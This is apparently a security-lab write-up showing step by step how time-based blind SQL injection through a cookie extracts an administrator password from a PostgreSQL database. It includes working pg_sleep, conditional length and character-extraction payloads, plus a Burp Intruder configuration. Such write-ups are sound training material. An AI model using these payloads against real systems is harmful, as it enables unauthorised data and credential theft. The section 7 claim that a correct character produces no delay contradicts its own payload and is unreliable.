## 🎯 Objective

Exploit a **blind SQL injection vulnerability using time delays** to extract the **administrator password**, relying solely on **response timing differences**, without any visible errors or reflected query output.

---

## 🧩 1. Initial Testing & Vulnerability Identification

### Parameters Tested

- URL parameters
- Cookie parameters

All parameters were tested with a single quote (`'`) and **no abnormal behavior** was observed.

### Observation

- No error messages
- No content changes
- No visible indication of SQL injection

At this stage, traditional error‑based or boolean‑based SQL injection **appeared impossible**.

---

### 🔴 IMPORTANT — Mindset Shift (Why This Matters)

> When no output changes and no errors are visible, it does not mean the application is secure.
> 

This is the moment to switch mindset from:

- *“What do I see?”*
    
    to:
    
- *“What can I **measure**?”*

**Time is still a side channel.**

This mindset allows exploitation of applications that appear completely silent.

---

## 🧠 2. Switching to Time‑Based Blind SQL Injection

Since no visible feedback was available, a **time‑delay payload** was used to test whether injected SQL was still being executed.

### Payload Used

```sql
TrackingId=HhHJ4ae6KNeTGR3R'||pg_sleep(10)--
```

### Result

- The page response was delayed by approximately **10 seconds**
- Page content remained unchanged
- The delay was consistent and repeatable

This confirms a **blind SQL injection vulnerability using time delays**.

---

## 🧪 3. Confirming Conditional Time Control

To verify that the delay could be controlled conditionally, a `CASE WHEN` expression was used.

### Payload Used

```sql
TrackingId=HhHJ4ae6KNeTGR3R'||
(SELECT CASE
  WHEN (username='administrator')
  THEN pg_sleep(10)
  ELSE pg_sleep(0)
END FROM users)--
```

### Result

- Response delayed by **10 seconds**

This confirms:

- The `users` table exists
- The `administrator` user exists
- Conditional logic can be evaluated through timing differences

---

## 🧠 4. Why This Is Blind SQL Injection

In this lab:

- No SQL errors are shown
- No query output is reflected
- The **only feedback channel is time**

This means:

- `UNION SELECT` is useless
- Error‑based SQLi is impossible
- Boolean conditions must be inferred via **response delays**

All data extraction must be performed using **time‑based conditions**.

---

## 🧪 5. Determining Password Length

Before extracting the password, its length must be identified.

### Payload Used

```sql
TrackingId=HhHJ4ae6KNeTGR3R'||
(SELECT CASE
  WHEN (username='administrator' AND LENGTH(password)=1)
  THEN pg_sleep(10)
  ELSE pg_sleep(0)
END FROM users)--
```

### Intruder Usage

- Password length was brute‑forced by incrementing the length value
- Response delays were monitored

### Result

- Delay observed when `LENGTH(password)=20`

This confirms the administrator password length is **20 characters**.

---

## 🧠 6. Why Length Detection Is Mandatory

Without knowing the password length:

- Character extraction becomes unreliable
- False positives are more likely
- Automation becomes inefficient

**Length detection is a required step in blind SQL injection workflows.**

---

## 🧪 7. Extracting the Password Character‑by‑Character

With the password length known, individual characters were extracted using `SUBSTRING()` and time delays.

### Payload Used

```sql
TrackingId=HhHJ4ae6KNeTGR3R'||
(SELECT CASE
  WHEN (username='administrator'
        AND SUBSTRING(password,1,1)='a')
  THEN pg_sleep(10)
  ELSE pg_sleep(0)
END FROM users)--
```

### Logic

- Correct character → **no delay**
- Incorrect character → **10‑second delay**

This inverted logic simplifies detection when automating.

---

## 🧪 8. Password Extraction with Burp Intruder

### Intruder Configuration

- Character position: `1–20`
- Character set: `a–z`, `0–9`
- Attack type: **Cluster Bomb**

### Analysis Method

- Identify requests with **fast responses**
- Each fast response reveals one correct character

This process was repeated until all 20 characters were extracted.

---

## 📊 9. Final Result

```sql
Username: administrator
Password: 018sbqptj9bm9brx9b5z
```

- Logged in successfully
- Application confirmed administrator access
- Lab marked as solved
- Screenshot
<img width="1264" height="264" alt="image" src="https://github.com/user-attachments/assets/75ce8c56-a4fc-423f-ac95-883ab7843701" />

---

## 🔮 10. Future Testing Notes (Important)

### When Testing SQL Injection:

1. Test **all inputs**:
    - URL parameters
    - POST data
    - Cookies
    - Headers
2. If no output or errors are visible:
    - **Immediately test time delays**
3. Blind SQLi workflow:
    - Confirm delay execution
    - Add conditional logic
    - Confirm data existence
    - Detect data length
    - Extract data character‑by‑character
    - Automate early
4. Common mistakes to avoid:
    - Giving up when no output is visible
    - Skipping length detection
    - Not constraining queries to a single row

---

## 🧭 11. Notes for My Future Self

- Silence does not mean safety
- Time is a powerful side channel
- Blind SQLi is about **measurement, not visibility**
- Cookies are common blind injection points
- Conditional delays can extract full credentials reliably
